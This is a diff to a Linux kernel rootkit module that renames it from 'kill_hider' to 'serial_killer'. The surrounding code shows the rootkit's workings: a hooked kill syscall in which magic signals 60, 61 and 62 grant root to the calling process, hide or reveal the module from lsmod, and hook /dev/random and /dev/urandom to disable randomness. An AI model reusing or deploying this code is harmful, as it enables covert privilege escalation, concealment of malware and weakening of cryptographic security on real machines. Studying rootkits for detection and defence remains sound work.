@@ -141,12 +141,12 @@ static asmlinkage int hook_kill(const struct pt_regs *regs) {
          // Credentials Handler
         case 60: 
             if (pid == 1) {
-                printk(KERN_INFO "kill_hider: Giving Root...\n");
+                printk(KERN_INFO "serial_killer: Giving Root...\n");
                 set_root();
                 has_taken_root = 1;
                 return 0;
             } else if (pid == 0) {
-                printk(KERN_INFO "kill_hider: Resetting UID...\n");
+                printk(KERN_INFO "serial_killer: Resetting UID...\n");
                 unset_root();
                 return 0;
             }
@@ -154,26 +154,26 @@ static asmlinkage int hook_kill(const struct pt_regs *regs) {
         // Presence Handler
         case 61:
             if (pid == 0 && is_hidden == 0) {
-                printk(KERN_ERR "kill_hider: Already Exposed!\n");
+                printk(KERN_ERR "serial_killer: Already Exposed!\n");
             } else if (pid == 0 && is_hidden == 1) {
-                printk(KERN_INFO "kill_hider: Exposing myself...\n");
+                printk(KERN_INFO "serial_killer: Exposing myself...\n");
                 show_lsmod();
                 is_hidden = 0;
             } else if (pid == 1 && is_hidden == 0) {
-                printk(KERN_INFO "kill_hider: Hiding myself...\n");
+                printk(KERN_INFO "serial_killer: Hiding myself...\n");
                 hide_lsmod();
                 is_hidden = 1;
             } else if (pid == 1 && is_hidden == 1) {
-                printk(KERN_ERR "kill_hider: Already Hidden!\n");
+                printk(KERN_ERR "serial_killer: Already Hidden!\n");
             }
             return 0;
         
         // Intercept /dev/random and /dev/urandom to remove pseudo randomization
         case 62:
             if (pid == 0 && is_random_active == 0) {
-                printk(KERN_ERR "kill_hider: RNG - Already Inactive!!\n");
+                printk(KERN_ERR "serial_killer: RNG - Already Inactive!!\n");
             } else if (pid == 0 && is_random_active == 1) {
-                printk(KERN_INFO "kill_hider: RNG - Deactivating...\n");
+                printk(KERN_INFO "serial_killer: RNG - Deactivating...\n");
                 err = fh_install_hook(&hooks[1]);
                 if (err) {
                     printk(KERN_DEBUG "install hook_random_read err value: %d\n", err);
@@ -187,12 +187,12 @@ static asmlinkage int hook_kill(const struct pt_regs *regs) {
                 }
                 is_random_active = 0;
             } else if (pid == 1 && is_random_active == 0) {
-                printk(KERN_INFO "kill_hider: RNG - Activating...\n");
+                printk(KERN_INFO "serial_killer: RNG - Activating...\n");
                 fh_remove_hook(&hooks[1]);
                 fh_remove_hook(&hooks[2]);
                 is_random_active = 1;
             } else if (pid == 1 && is_random_active == 1) {
-                printk(KERN_ERR "kill_hider: RNG - Already Active!");
+                printk(KERN_ERR "serial_killer: RNG - Already Active!");
             }
 
         
@@ -216,12 +216,12 @@ static asmlinkage int hook_kill(pid_t pid, int sig)
          // Credentials Handler
         case 60: 
             if (pid == 0) {
-                printk(KERN_INFO "kill_hider: Giving Root...\n");
+                printk(KERN_INFO "serial_killer: Giving Root...\n");
                 set_root();
                 has_taken_root = 1;
                 return 0;
             } else if (pid == 1) {
-                printk(KERN_INFO "kill_hider: Resetting UID...\n");
+                printk(KERN_INFO "serial_killer: Resetting UID...\n");
                 unset_root();
                 return 0;
             }
@@ -229,17 +229,17 @@ static asmlinkage int hook_kill(pid_t pid, int sig)
         // Presence Handler
         case 61:
             if (pid == 0 && is_hidden == 0) {
-                printk(KERN_ERR "kill_hider: Already Exposed!\n");
+                printk(KERN_ERR "serial_killer: Already Exposed!\n");
             } else if (pid == 0 && is_hidden == 1) {
-                printk(KERN_INFO "kill_hider: Exposing myself...\n");
+                printk(KERN_INFO "serial_killer: Exposing myself...\n");
                 show_lsmod();
                 is_hidden = 0;
             } else if (pid == 1 && is_hidden == 0) {
-                printk(KERN_INFO "kill_hider: Hiding myself...\n");
+                printk(KERN_INFO "serial_killer: Hiding myself...\n");
                 hide_lsmod();
                 is_hidden = 1;
             } else if (pid == 1 && is_hidden == 1) {
-                printk(KERN_ERR "kill_hider: Already Hidden!\n");
+                printk(KERN_ERR "serial_killer: Already Hidden!\n");
             }
             return 0;
 
@@ -286,7 +286,7 @@ void hide_lsmod(void) {
 }
 
 
-int __init kill_hider_init(void){
+int __init serial_killer_init(void){
 
     int err;
     //err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
@@ -297,20 +297,20 @@ int __init kill_hider_init(void){
         printk(KERN_DEBUG "err value: %d\n", err);
         return err;
     }
-    printk(KERN_DEBUG "kill_hider: Loaded!\n");
+    printk(KERN_DEBUG "serial_killer: Loaded!\n");
     return 0;
 }
 
-void __exit kill_hider_exit(void){
+void __exit serial_killer_exit(void){
     //fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     fh_remove_hook(&hooks[0]);
     if (is_random_active == 0) {
         fh_remove_hook(&hooks[1]);
         fh_remove_hook(&hooks[2]);
     }
-    printk(KERN_DEBUG "kill_hider: Unloaded!\n");
+    printk(KERN_DEBUG "serial_killer: Unloaded!\n");
 }
 
-module_init(kill_hider_init);
-module_exit(kill_hider_exit);
+module_init(serial_killer_init);
+module_exit(serial_killer_exit);
 
